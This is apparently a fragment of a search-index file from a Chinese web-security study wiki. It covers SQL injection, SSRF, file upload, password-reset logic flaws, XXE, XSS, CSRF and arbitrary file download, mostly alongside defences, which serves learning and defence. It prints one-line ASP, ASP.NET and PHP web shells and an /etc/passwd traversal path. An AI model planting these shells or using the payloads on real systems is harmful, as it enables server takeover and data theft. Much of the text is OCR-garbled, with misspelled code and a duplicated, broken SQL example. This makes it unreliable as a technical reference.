'admin'#), homepage=' password)\uff0c nomepage= <span class=\"arithmatex\"><span class=\"MathJax_Preview\">homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id='</span><script type=\"math/tex\">homepage' WHERE id='id\" \u5982\u679c\u6b64SQL\u88ab\u4fee\u6539\u6210\u4ee5\u4e0b\u5f62\u5f0f\uff0c\u5c31\u5b9e\u73b0\u4e86\u6ce8\u5165\u3002 1)\u4fee\u6539homepage\u503c\u4e3ahtpper. uereve=*3 \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET paswordra'mypass homepage=' ht:xx net', userlevel='3' WHERE id=' id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage='id\" userlevel\u4e3a\u7528\u6237\u7ea7\u522b 2)\u4fee\u6539password\u503c\u4e3amypass)' WHERE username= admin'# \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password= \"MD5(mypass)' WHERE username= 'admin'#), homepage=' romepage' WHERE id=' id' 3)\u4fee\u6539id\u503c\u4e3aOR username= 'admin \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password=\"MD5( id' 3)\u4fee\u6539id\u503c\u4e3aOR username= 'admin \u4e4b\u540eSQL\u8bed\u53e5\u53d8\u4e3a: UPDATE user SET password=\"MD5( password)'; homepage= $homepage' WHERE id=\" OR username=' admin' SSRF \u00b6 \u56e0\u4e3aSSRF\u6f0f\u6d1e\u662f\u8ba9\u670d\u52a1\u5668\u53d1\u9001\u8bf7\u6c42\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u6240\u4ee5\u5c31\u53ef\u4ee5\u901a\u8fc7\u6293\u5305\u5206\u6790\u53d1\u9001 \u7684\u8bf7\u6c42\u662f\u5426\u662f\u7531\u670d\u52a1\u5668\u6240\u53d1\u9001\u7684\uff0c\u4ece\u800c\u6765\u5224\u65ad\u662f\u5426\u5b58\u5728SSRF\u6f0f\u6d1e;\u6cd5\u5df2\u5f53\u4e0d\u884c \u5728\u9875\u9762\u6e90\u7801\u4e2d\u67e5\u627e\u8bbf\u95ee\u7684\u8d44\u6e90\u5730\u5740\uff0c\u5982\u679c\u8be5\u8d44\u6e90\u5730\u5740\u7c7b\u578b\u4e3a\u8336\u4e1a\u5982\u606f\u4ea4 www.baidu . compxxphp?image= (\u5730\u5740) \u7684\u5c31\u53ef\u80fd\u5b58\u5728SSRF\u6f0f\u6d1e\u3002 \u6210\u56e0:\u6a21\u62df\u670d\u52a1\u5668\u5bf9\u5176\u4ed6\u670d\u52a1\u5668\u8d44\u6e90\u8fdb\u884c\u8bf7\u6c42\uff0c\u6ca1\u6709\u505a\u5408\u6cd5\u6027\u9a8c\u8bc1\u3002 \u5229\u7528:\u6784\u9020\u6076\u610f\u5185\u7f51P\u505a\u63a2\u6d4b\uff0c\u6216\u8005\u4f7f\u7528\u5176\u4f59\u6240\u652f\u6301\u7684\u534f\u8bae\u5bf9\u5176\u4f59\u670d\u52a1\u8fdb\u4eba \u51fb\u3002\u9632\u5fa1:\u7981\u6b62\u8df3\u8f6c\uff0c\u9650\u5236\u534f\u8bae\uff0c\u5185\u5916\u7f51\u9650\u5236\uff0cURL \u9650\u5236\u3002 \u7ed5\u8fc7:\u4f7f\u7528\u4e0d\u540c\u534f\u8bae\uff0c\u9488\u5bf9IP IP\u683c\u5f0f\u7684\u7ed5\u8fc7\uff0c \u9488\u5bf9URL, \u6076\u610fURL\u589e\u5929\uff0c \u5b87\u7b26\uff0c@\u4e4b\u7c7b\u7684\u3002301\u8df3\u8f6c-drs rbindaingo \u6587\u4ef6\u4e0a\u4f20 \u00b6 23\u3001\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u539f\u7406 \u7531\u4e8e\u7a0b\u5e8f\u5458\u5728\u5bf9\u7528\u6237\u6587\u4ef6\u4e0a\u4f20\u90c1\u5206\u7684\u63a7\u5236\u4e0d\u8db3\u6216\u8005\u5904\u7406\u7f3a\u9677\u800c\u5bfc\u81f4\u7528\u6237\u53ef\u4ee5\u8d8a \u8fc7\u5176\u672c\u8eab\u6743\u9650\u5411\u670d\u52a1\u5668\u4e0a\u4f20\u53ef\u6267\u884c\u7684\u52a8\u6001\u811a\u672c\u6587\u4ef6\u3002 24\u3001\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570 PHP: include(). include. once), require(), re-quire. once(), topen), readfile() JSP/Servlet: ava io.Filc(), java.io.Fil- eReader() ASP: include file, include virtual 28\u3001\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u7ed5\u8fc7\u65b9\u6cd5 \u524d\u7aefJs\u7ed5\u8fc7\u3001\u9ed1\u767d\u540d\u5355\u7ed5\u8fc7\u3001\u6587\u4ef6\u7c7b\u578b\u7ed5\u8fc7(mime\u3001 \u6587\u4ef6\u5934\u3001\u6587\u4ef6\u5185\u5bb9)\u3001\u8def \u5f84\u622a\u65ad\u7ed5\u8fc7(00 \u622a\u65ad)\u3001\u4e2d\u95f4\u4ef6\u89e3\u6790\u6f0f\u6d1e\u3001\u6761\u4ef6\u7ade\u4e89\u3001\u6b21\u6e32\u67d3 \u3001\u7f16\u8f91\u5668\u6f0f\u6d1e 29\u3001\u6587\u4ef6\u4e0a\u4f20\u9632\u5fa1\u65b9\u6cd5 \u4e0a\u4f20\u76ee\u5f55\u7684\u7528\u6237\u6267\u884c\u6743\u9650\u5168\u90e8\u53d6\u6d88\u3001\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u3001\u4f7f\u7528\u968f\u673a\u6570\u6539\u5199\u6587\uff0c \u8005\u548c\u7236 \u4ef6\u8def\u5f84\u3001\u7f51\u7ad9\u670d\u52a1\u5668\u548c\u6587\u4ef6\u670d\u52a1\u5668\u5206\u79bb\u3001\u767d\u540d\u5355\u68c0\u67e5\u3001\u9650\u5236\u6587\u4ef6\u5927\u5c0f \u91d1\u878d\u884c\u4e1a\u5e38\u89c1\u903b\u8f91\u6f0f\u6d1e \u00b6 \u4e3b\u8981\u662f\u6570\u636e\u7684\u7be1\u6539(\u6d89\u53ca \u53ca\u91d1\u878d\u6570\u636e\uff0c\u6216\u90e8\u5206\u4e1a\u52a1\u7684\u5224\u65ad\u6570\u636e)\uff0c\u7531\u7ade\u4e89\u6761\u4ef6\u6216\u8005\u8bbe \u8ba1\u4e0d\u5f53\u5f15\u8d77\u7684\u8584\u7f8a\u6bdb\uff0c\u4ea4\u6613\u95e8\u5355\u4fe1\u601d\u6cc4\u9732\u6c34\u5e73\u8d8a\u4eea\u5bf9\u522b\u4eba\u7684\u8d26\u6237\u67e5\u770b\u6216\u60e0\u610f\u64cd\u4f5c\uff0c\u4ea4\u6613\u6216\u4e1a\u52a1\u6b65\u9aa4\u7ed5\u8fc7\u3002 37\u3001\u8bf4\u51fa\u81f3\u5c11\u4e09\u79cd\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e\uff0c\u4ee5\u53ca\u4fee\u590d\u65b9\u5f0f \u5bc6\u7801\u627e\u56de\u6f0f\u6d1e\u4e2d\u5b58\u5728: 1)\u5bc6\u7801\u5141\u8bb8\u66b4\u529b\u7834\u89e3 2)\u5b58\u5728\u901a\u7528\u578b\u627e\u56de\u51ed\u8bc1 3)\u53ef\u4ee5\u8df3\u8fc7\u9a8c\u8bc1\u6b65\u9aa4 4)\u627e\u56de\u51ed\u8bc1\u53ef\u4ee5\u62e6\u5305\u83b7\u53d6 \u7b49\u65b9\u5f0f\u6765\u901a\u8fc7\u5382\u5546\u63d0\u4f9b\u7684\u5bc6\u7801\u627e\u56de\u529f\u80fd\u6765\u5f97\u5230\u5bc6\u7801\u3002 \u8eab\u4efd\u8ba4\u8bc1\u6f0f\u6d1e\u4e2d\u6700\u5e38\u89c1\u7684\u662f: 5)\u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb 6)Cookie \u4eff\u5192 \u53ea\u8981\u5f97\u5230Session \u6216Cookie \u5373\u53ef\u4f2a\u9020\u7528\u6237\u8eab\u4efd\u3002 \u9a8c\u8bc1\u7801\u6f0f\u6d1e\u4e2d\u5b58\u5728: 7)\u9a8c\u8bc1\u7801\u5141\u8bb8\u66b4\u529b\u7834\u89e3 8)\u9a8c\u8bc1\u7801\u53ef\u4ee5\u901a\u8fc7Javascipt \u6216\u8005\u6539\u5305\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u7ed5\u8fc7 \u767b\u5f55\u6846\u7684 \u00b6 xss\uff0c\u5f31\u53e3\u4ee4\uff0csql\u6ce8\u5165\uff0ccms\u6f0f\u6d1e\uff0c\u627e\u56de\u5bc6\u7801\u903b\u8f91\u6f0f\u6d1e\uff0c\u529f\u80fd\u6027\u7684\u903b\u8f91\u6f0f\u6d1e\u7b49\u7b49\u3002 \u627e\u56de\u5bc6\u7801\u5904 1.\u7206\u7834\u9a8c\u8bc1\u7801\uff1a \u5982\u679c\u5f53\u9a8c\u8bc1\u53ea\u67094-5\u4f4d\u5b58\u6570\u5b57 \u7206\u7834\u9a8c\u8bc1\u7801\u7684\u6210\u529f\u7387\u5f88\u9ad8 \uff1a\u6bd4\u5982 100\u4e2a\u7ebf\u7a0b \u7206\u78344\u4f4d\u7684\u4e5f\u5c311\u5206\u591a\u949f\u5c31\u641e\u5b9a\uff1a \u5982\u4f55\u4fee\u590d:\u9a8c\u8bc1\u7801\u9a8c\u8bc1\u5b57\u6570\u9650\u5236\u52a0\u65f6\u95f4\u9650\u5236 2.\u51ed\u8bc1\u5728\u9875\u9762\u4e0a \uff1a\u6bd4\u5982\u4f60\u6700\u540e\u8bbe\u7f6e\u5bc6\u7801\u7684\u65f6\u5019\uff0c url/userid=1234$type=1 \u8fd9\u4e2a\u4f60\u4fee\u6539ID \u5c31\u76f4\u63a5\u53ef\u4ee5\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801\uff1b \u5982\u4f55\u4fee\u590d:\u8bf7\u52ff\u5427\u91cd\u8981\u6570\u636e\u8fd4\u56de\u5ba2\u6237\u7aef or \u6570\u636e\u52a0\u5bc6\u4e0d\u53ef\u9006 3.\u8fd4\u56de\u51ed\u8bc1: \u6709\u65f6\u5019 \u4ed6\u4f1a\u628a\u51ed\u8bc1 \u6bd4\u5982\u9a8c\u8bc1\u7801\u95ee\u9898\u7b54\u6848 \u4e4b\u7c7b\u7684 \u76f4\u63a5\u8fd4\u56de\u5728html \u4ee3\u7801\u91cc or \u6570\u636e\u5305\u4e2d \u4f60\u5c31\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\u4e86 \u5982\u4f55\u4fee\u590d:\u8bf7\u52ff\u5427\u91cd\u8981\u6570\u636e\u8fd4\u56de\u5ba2\u6237\u7aef 4.\u672a\u4e25\u683c\u9a8c\u8bc1\uff1a\u6bd4\u5982\u4f60\u5728\u627e\u56de\u5bc6\u7801\u7684\u65f6\u5019 \u4ed6\u4f1a\u628a\u9a8c\u8bc1\u7801\u53d1\u9001\u90ae\u7bb1 \uff0c\u4f46\u662f\uff0c\u5728\u53d1\u9001\u6570\u636e\u65f6\u5019\uff0c\u4f60\u5c06\u5305\u62e6\u622a\u4e0b\u6765 \u4fee\u6539\u90ae\u7bb1 \u5c31\u53ef\u4ee5\u5427\u9a8c\u8bc1\u7801\u53d1\u9001\u5230\u81ea\u5df1\u7684\u90ae\u7bb1 \u6210\u529f\u7ed5\u8fc7\u90ae\u7bb1 \u5982\u4f55\u4fee\u590d:\u4e25\u683c\u9a8c\u8bc1 \u5728\u53d1\u9001\u90ae\u7bb1\u65f6\u9a8c\u8bc1\u63a5\u6536\u90ae\u7bb1 5.\u672c\u5730\u9a8c\u8bc1\uff1a\u6709\u65f6\u5019\u4ed6\u4f1a\u8fd4\u56de\u7684\u72b6\u6001\u7801 \u8fd8\u6709\u8fd4\u56de\u53c2\u6570\u503c \u5982\u679c\u4f60\u4fee\u6539\u72b6\u6001\u7801\u4e3a200 \u6216\u8005 \u53c2\u6570\u503c\u7b49\u4e8e1 \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1 \u5982\u4f55\u4fee\u590d:\u5efa\u8bae\u670d\u52a1\u7aef\u9a8c\u8bc1 6.token \u53ef\u9006 \uff1a\u6700\u540e\u5728url\u4e0a\u7684\u53c2\u6570 \u7528\u6237ID \u52a0 token \u7ed3\u679c\u4f60\u53d1\u73b0 token \u53ef\u4ee5\u89e3\u5bc6 or \u6709\u89c4\u5f8b \u5c31\u53ef\u4ee5\u4fee\u6539ID \u7b97\u51fatoken \u6210\u529f\u7ed5\u8fc7 \u5982\u4f55\u4fee\u590d:token \u4e0d\u53ef\u9006 \u968f\u673a 7.\u91cd\u65b0\u7ed1\u5b9a \u90ae\u7bb1 or \u624b\u673a \uff1a \u6709\u65f6\u5019\u5728\u6ce8\u518c\u5b8c\u7528\u6237\u540e \u4ed6\u8981\u4f60\u7ed1\u5b9a\u624b\u673a or \u90ae\u7bb1 \u7ed3\u679c\u4f60\u8fd8\u53d1\u73b0 uid \u53ef\u63a7 \u600e\u4e48\u6837\u7ed5\u8fc7 \u6211\u5c31\u4e0d\u8bf4\u4e86\u5427 23333.. \u5982\u4f55\u4fee\u590d:\u7ed1\u5b9a\u65f6\u9a8c\u8bc1\u7528\u6237\u662f\u5426\u4ee5\u53ca\u7ed1\u5b9a \u5426\u5219\u4f1a\u8986\u76d6 \u6570\u636e 23333... 8.\u6743\u9650\u5e73\u884c \uff1a\u6709\u65f6\u5019\u4ed6\u6700\u540e \u9a8c\u8bc1cookie \u800ccookie\u503c&uid=xxxxx ; \u4f60\u4fee\u6539\u540e\u9762\u7684UID \u4e00\u6837\u4e5f\u53ef\u4ee5 \u6709\u65f6\u5019 session \u4e5f\u53ef\u4ee5\u8986\u76d6 \u5982\u4f55\u4fee\u590d:cookie session \u552f\u4e00 2333.. 9.\u6ce8\u518c\u8986\u76d6 :\u6709\u65f6\u5019 \u660e\u660e\u7528\u6237\u5df2\u7ecf\u6ce8\u518c \u4f46\u662f\u4ed6\u662f\u672c\u5730\u8fdb\u884c\u9a8c\u8bc1 \u6709\u65f6\u5019\u52a0\u4e2a\u5305\u4ec0\u4e48\u65f6\u5019\u5c31\u7ed5\u8fc7\u53bb\u4e86 \u7136\u540e\u6dfb\u52a0\u7528\u6237\u6210\u529f\u968f\u4e4b\u8986\u76d6 \u5982\u4f55\u4fee\u590d:\u670d\u52a1\u7aef\u7528\u6237\u662f\u5426\u5df2\u7ecf\u6ce8\u518c \u5982\u679c\u5b58\u5728 \u8fd4\u56defalse ; 10\uff1a\u6ce8\u518c\u5904 \u5b58\u5728sql\u7b49\u5176\u4ed6\u6f0f\u6d1e \u5982\u4f55\u4fee\u590d\uff1a\u8fd9\u4e2a\u6d89\u53ca\u592a\u5e7f\u770b\u5b98\u4eec\u81ea\u5df1\u60f3 2333... XXE \u00b6 \u539f\u7406: XXE (XML \u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\uff0cXML External Entty)\uff0c\u5728\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790XML \u8f93\u5165\u65f6\uff0c\u5f53\u5141\u8bb8\u5f15\u7528\u5916\u90e8\u5b9e\u4f53\u65f6\uff0c\u53ef\u6784\u9020\u6076\u610f\u5185\u5bb9\uff0c\u5bfc\u81f4\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6\u3001\u63a2\u6d4b\u5185 \u7f51\u7aef\u53e3\u3001\u653b\u51fb\u5185\u7f51\u7f51\u7ad9\u3001\u53d1\u8d77DoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3001\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7b49\u3002 Java\u4e2d\u7684XXE\u652f\u6301sun.net. ww.protcco\u91cc\u7684\u6240\u6709\u534f\u8bae: http. https, fle, ftp. mailto, jar, netdoc, \u4e00 \u822c\u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u6587\u4ef6\uff0c\u5229\u7528http\u534f\u8bae\u63a2\u6d4b\u5185\u7f51\u3002 \u9632\u5fa1:\u914d\u7f6eXML\u5904\u7406\u5668\u4f7f\u7528\u7981\u7528DTD\u3001\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u89e3\u6790\u3001\u901a\u8fc7\u9ed1\u540d\u5355\u8fc7\u6ee4\u7528 \u6237\u63d0\u4ea4\u7684XML\u6570\u636e\u3002 \u4e00\u53e5\u8bdd\u6728\u9a6c \u00b6 ASP: <%eval request(\"cmd\")%> ASP.NET: (aspx) <%@ Page Language= \"Jscript\"%> <%eval(Request.ltem[\"cmd\"]\"unsafe\");%> PHP: <?php @eval($_ REQUEST['cmd]):?> \u7b80\u8ff0PHP\u4ee3\u7801\u6ce8\u5165\u548c\u547d\u4ee4\u6ce8\u5165\u7684\u6210\u56e0\u548c\u5371\u5bb3 PHP\u4e2deval\u3001aser. call _user. func\u7b49\u51fd\u6570\u4f1a\u5c06\u5b57\u7b26\u4e32\u5f53\u4f5cPHP\u4ee3\u7801\u6267\u884c\uff0c\u65e5\u6c5f \u6709\u5bf9\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u3002\u5e94\u7528\u5728\u8c03\u7528sytem\u7b49\u51fd\u6570\u65f6\u4f1a\u5c06\u5b57\u7b26\u4e32\u62fc\u63a5\u5230\u547d\u4ee4\u884c\u4e2d \u4e14\u6ca1\u6709\u8fc7\u6ee4\u7528\u6237\u8f93\u4eba\u3002 PHP\u6ce8\u5165\u4f1a\u4f7f\u653b\u51fb\u8005\u6267\u884c\u4efb\u610f\u4ee3\u7801getshel\u4ece\u800c\u63a7\u5236\u7f51\u7ad9\u6216\u670d\u52a1\u5668\u3002\u7cfb\u7edf\u6ce8\u5165\u3002 \u4f7f\u653b\u51fb\u8005\u7ee7\u627fweb\u670d\u52a1\u5668\u7a0b\u5e8f\u6743\u9650\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u5199\u6587\u4ef6\u3001\u53cd\u5f39shell, !\u4ece\u800c\u63a7\u5236\u6574\u4e2a\u7f51\u7ad9\u751a\u81f3\u670d\u52a1\u5668\u3002 \u4fe1\u606f\u6cc4\u9732 \u00b6 \u914d\u7f6e\u6587\u4ef6\u8bbf\u95ee \u2022 httpd.conf \u2022 htaccess \u2022 HTPASSWD \u2022 boot.ini \u2022 etc/passwd \u2022 Php.ini \u2022 Web.xml","title":"web\u5b89\u5168"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_1","text":"","title":"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#xss","text":"\u53cd\u5c04\u3001dom\u3001\u5b58\u50a8 \u76d7\u53d6\u7528\u6237Cookie\u3001\u672a\u6388\u6743\u64cd\u4f5c\u3001\u4fee\u6539DOM\u3001\u5237\u6d6e\u7a97\u5e7f\u544a\u3001\u53d1\u52a8XSS\u8815\u866b\u653b\u51fb\u3001 \u52ab\u6301\u7528\u6237\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u6e17\u900f\u5185\u7f51\u3002 \u9632\u62a4 1)\u5c06HTML\u5143\u7d20\u5185\u5bb9\u3001\u5c5e\u6027\u4ee5\u53caURL\u8bf7\u6c42\u53c2\u6570\u3001CSS \u503c\u8fdb\u884c\u7f16\u7801 2)\u5f53\u7f16\u7801\u5f71\u54cd\u4e1a\u52a1\u65f6\uff0c\u4f7f\u7528\u767d\u540d\u5355\u89c4\u5219\u8fdb\u884c\u68c0\u6d4b\u548c\u8fc7\u6ee4 3)\u4f7f\u7528W3C\u63d0\u51fa\u7684CSP (Content Security Policy, \u5185\u5bb9\u5b89\u5168\u7b56\u7565)\uff0c\u5b9a\u4e49\u57df\u540d\u767d\u540d\u5355 4)\u8bbe\u7f6ecookie\u7684httponly\u5c5e\u6027","title":"xss\u6f0f\u6d1e"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#csrf","text":"1)\u6700\u5bb9\u6613\u5b9e\u73b0\u7684\u662fGet\u8bf7\u6c42\uff0c\u4e00\u822c\u8fdb\u5165\u9ed1\u5ba2\u7f51\u7ad9\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6eimg\u7684src\u5c5e \u6027\u6765\u81ea\u52a8\u53d1\u8d77\u8bf7\u6c42 2)\u5728\u9ed1\u5ba2\u7684\u7f51\u7ad9\u4e2d\uff0c\u6784\u9020\u9690\u85cf\u8868\u5355\u6765\u81ea\u52a8\u53d1\u8d77Post\u8bf7\u6c42 3)\u901a\u8fc7\u5f15\u8bf1\u94fe\u63a5\u8bf1\u60d1\u7528\u6237\u70b9\u51fb\u89e6\u53d1\u8bf7\u6c42\uff0c\u5229\u7528a\u6807\u7b7e\u7684href \u9632\u62a4 1)\u9488\u5bf9\u5b9e\u9645\u60c5\u51b5\uff0c\u8bbe\u7f6e\u5173\u952eCookie \u7684SameSite\u5c5e\u6027\u4e3aStrict \u6216Lax 2)\u670d\u52a1\u7aef\u9a8c\u8bc1\u8bf7\u6c42\u6765\u6e90\u7ad9\u70b9(Referer\u3001Origin) 3)\u4f7f\u7528CSRFToken,\u670d\u52a1\u7aef\u968f\u673a\u751f\u6210\u8fd4\u56de\u7ed9\u6d4f\u89c8\u5668\u7684Token,\u6bcf-\u6b21\u8bf7\u6c42\u90fd\u4f1a\u643a\u5e26\u4e0d\u540c\u7684CSRF Token 4)\u52a0\u5165\u4e8c\u6b21\u9a8c\u8bc1 45\u3001token\u548creferer\u505a\u6a2a\u5411\u5bf9\u6bd4\uff0c\u8c01\u5b89\u5168\u7b49\u7ea7\u9ad8 token\u5b89\u5168\u7b49\u7ea7\u66f4\u9ad8\uff0c\u56e0\u4e3a\u5e76\u4e0d\u662f\u4efb\u4f55\u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u53d6\u5f97referer, \u5982\u679c\u4eceHTTPS \u8df3\u5230HTTP,\u4e5f\u4e0d\u4f1a\u53d1\u9001referer\u3002\u5e76\u4e14FLASH\u4e00\u4e9b\u7248\u672c\u4e2d\u53ef\u4ee5\u81ea\u5b9a\u4e49referer\u3002\u4f46 \u662ftoken\u7684\u8bdd\uff0c\u8981\u4fdd\u8bc1\u5176\u8db3\u591f\u968f\u673a\u4e14\u4e0d\u53ef\u6cc4\u9732\u3002 46\u3001\u5bf9referer\u7684\u9a8c\u8bc1\uff0c\u4ece\u4ec0\u4e48\u89d2\u5ea6\u53bb\u505a?\u5982\u679c\u505a\uff0c\u600e\u4e48\u675c\u7edd\u95ee\u9898 \u5bf9header\u4e2d\u7684referer\u7684\u9a8c\u8bc1\uff0c- \u4e2a\u662f\u7a7areferer,\u4e00\u4e2a\u662freferer\u8fc7\u6ee4\u6216\u8005\u68c0\u6d4b \u4e0d\u5b8c\u5584\u3002\u4e3a\u4e86\u675c\u7edd\u8fd9\u79cd\u95ee\u9898\uff0c\u5728\u9a8c\u8bc1\u7684\u767d\u540d\u5355\u4e2d\uff0c\u6b63\u5219\u89c4\u5219\u5e94\u5f53\u5199\u5b8c\u5584\u300299 47\u3001\u9488\u5bf9token\u653b\u51fb\uff0c\u4f60\u4f1a\u5bf9token\u7684\u54ea\u65b9\u9762\u8fdb\u884c\u6d4b\u8bd5 \u9488\u5bf9token\u7684\u653b\u51fb\uff0c\u4e00\u662f\u5bf9\u5b83\u672c \u8eab\u7684\u653b\u51fb\uff0c\u91cd\u653e\u6d4b\u8bd5\u4e00\u6b21\u6027\u3001 \u5206\u6790\u52a0\u5bc6\u89c4\u5219\u3001\u6821 \u9a8c\u65b9\u5f0f\u662f\u5426\u6b63\u786e\u7b49\uff0c\u4e8c\u662f\u7ed3\u5408\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u5bf9\u5b83\u7684\u83b7\u53d6\uff0c\u7ed3\u5408\u7740\u53d1\u8d77\u7ec4\u5408\u653b\u51fb\u3002 \u4fe1\u606f\u6cc4\u9732\u6709\u53ef\u80fd\u662f\u7f13\u5b58\u3001\u65e5\u5fd7\u3001get,\u4e5f\u6709\u53ef\u80fd\u662f\u5229\u7528\u8de8\u7ad9\u3002\u5f88\u591a\u8df3\u8f6c\u767b\u5f55\u7684\u90fd \u4f9d\u8d56token,\u6709\u4e00\u4e2a\u8df3\u8f6c\u6f0f\u6d1e\u52a0\u53cd\u5c04\u578b\u8de8\u7ad9\u5c31\u53ef\u4ee5\u7ec4\u5408\u6210\u767b\u5f55\u52ab\u6301\u4e86\u3002 \u53e6\u5916\u4e5f\u53ef\u4ee5\u7ed3\u5408\u7740\u5176\u5b83\u4e1a\u52a1\u6765\u63cf\u8ff0token\u7684\u5b89\u5168\u6027\u53ca\u8bbe\u8ba1\u4e0d\u597d\u600e\u4e48\u88ab\u7ed5\u8fc7\u6bd4\u5982 \u62a2\u7ea2\u5305\u4e1a\u52a1\u4e4b\u7c7b\u7684\u3002","title":"csrf"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_2","text":"\u5229\u7528\u6761\u4ef6:\u5b58\u5728\u8bfb\u6587\u4ef6\u7684\u51fd\u6570;\u8bfb\u53d6\u6587\u4ef6\u7684\u8def\u5f84\u7528\u6237\u53ef\u63a7\u4e14\u672a\u6821\u9a8c\u6216\u6821\u9a8c\u4e0d\u4e25; \u8f93\u51fa\u4e86\u6587\u4ef6\u5185\u5bb9\u3002 \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u548c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6709\u7740\u76f8\u4f3c\u7684\u5730\u65b9:\u5c31\u662f\u90fd\u9700\u8981\u8def\u5f84\uff0c\u4f8b\u5982 index.php?f-file:///etc/ passwd, index.php?f= ./index.php 32\u3001\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\u7684\u4fee\u590d\u65b9\u6848 1)\u8fc7\u6ee4\u7528\u6237\u6570\u636e\uff0c\u5982\"/\"\uff0c \u201c*.\"\u7b49\u7279\u6b8a\u5b57\u7b26 2)\u66f4\u65b0\u4e2d\u95f4\u4ef6 3)\u8981\u4e0b\u8f7d\u7684\u6587\u4ef6\u5730\u5740\u4fdd\u5b58\u81f3\u6570\u636e\u5e93\u4e2d 4)\u6587\u4ef6\u8def\u5f84\u4fdd\u5b58\u81f3\u6570\u636e\u5e93\uff0c\u8ba9\u7528\u6237\u63d0\u4ea4\u6587\u4ef6\u5bf9\u5e94ID\u6216session\u4e0b\u8f7d\u6587\u4ef6 5)\u7528\u6237\u4e0b\u8f7d\u6587\u4ef6\u4e4b\u524d\u9700\u8981\u8fdb\u884c\u6743\u9650\u5224\u65ad 6)\u6587\u4ef6\u653e\u5728web\u65e0\u6cd5\u76f4\u63a5\u8bbf\u95ee\u7684\u76ee\u5f55\u4e0b 7)\u4e0d\u5141\u8bb8\u63d0\u4f9b\u76ee\u5f55\u904d\u5386\u670d\u52a1 8)\u516c\u5f00\u6587\u4ef6\u53ef\u653e\u7f6e\u5728weD\u5e94\u7528\u7a0b\u5e8f\u4e0b\u8f7d\u76ee\u5f55\u4e2d\u901a\u8fc7\u94fe\u63a5\u8fdb\u884c\u4e0b\u8f7d","title":"\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#_3","text":"\u7ed5\u8fc7\u65b9\u5f0f","title":"\u77ed\u4fe1\u91cd\u7f6e\u5bc6\u7801"},{"location":"%E5%AE%89%E5%85%A8wiki/Web%E5%AE%89%E5%85%A8/#sql","text":"\u6309\u6570\u636e\u7684\u4f20\u9012\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a: get\u6ce8\u5165\u3001post\u6ce8\u5165\u3001cookie \u6ce8\u5165 \u6839\u636e\u6ce8\u5165\u70b9\u7c7b\u578b\u5206\u7c7b:\u6570\u5b57\u578b\u3001\u5b57\u7b26\u578b \u6839\u636e\u6267\u884c\u6548\u679c\u5206\u7c7b:\u6709\u56de\u663e\u7684\u6ce8\u5165\u3001\u76f2\u6ce8\u3001\u62a5\u9519\u6ce8\u5165\u3001\u5806\u53e0\u6ce8\u5165\u3001\u5bbd\u5b57\u8282\u6ce8\u5165 \u64cd\u4f5c\uff0c\u4ea4\u6613\u6216\u4e1a\u52a1\u6b65\u9aa4\u7ed5\u8fc7\u3002 \u5b57\u7b26\u88ab\u8f6c\u4e49 \u5bbd\u5b57\u8282\uff0chex\u7f16\u7801 15\u3001\u4ee3\u7801\u6267\u884c\uff0c\u6587\u4ef6\u8bfb\u53d6\uff0c\u547d\u4ee4\u6267\u884c\u7684\u51fd\u6570\u90fd\u6709\u54ea\u4e9b 1)\u4ee3\u7801\u6267\u884c: eval,preg_ replacc+/e,assert,call user. func,call user func arry,create function 2)\u6587\u4ef6\u8bfb\u53d6: file get .contents0,highlight file0,fopen0.readfle0.fread0.fgetss), fgets().parse in_ file(),show_ source),file() 3)\u547d\u4ee4\u6267\u884c: system(, exec(), shell exec0, passthru() 